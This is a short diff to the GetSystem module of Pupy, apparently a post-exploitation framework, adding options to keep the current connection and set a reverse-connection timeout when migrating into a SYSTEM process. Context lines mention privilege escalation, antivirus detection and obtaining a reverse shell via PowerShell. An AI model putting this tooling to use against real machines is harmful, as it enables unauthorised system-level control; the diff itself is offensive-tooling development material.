@@ -30,6 +30,9 @@ class GetSystem(PupyModule):
         self.arg_parser.add_argument('-m', dest='migrate', action='store_true', default=True, help="Used by default: migrate to the system process (could be detected by AV)")
         self.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help="Restart current executable as admin")
         self.arg_parser.add_argument('-p', dest='powershell', action='store_true', default=False, help="Use powershell to automatically get a reverse shell")
+        self.arg_parser.add_argument('-k', dest='keep', action='store_true', default=False, help="Keep this current connection after migration (default: %(default)s)")
+        self.arg_parser.add_argument('-t', dest='timeout', default=60, type=int, help="Wait n seconds a reverse connection during migration (default: %(default)s)")
+        keep=False
 
     def run(self, args):
 
@@ -115,7 +118,7 @@ class GetSystem(PupyModule):
             proc_pid = self.client.conn.modules["pupwinutils.security"].getsystem(prog=cmd)
 
         if args.migrate and not args.restart and not args.powershell:
-            migrate(self, proc_pid)
+            migrate(self, proc_pid, keep=args.keep, timeout=args.timeout)
             self.success("got system !")
         else:
             if isBindLauncherForPs1 == True:
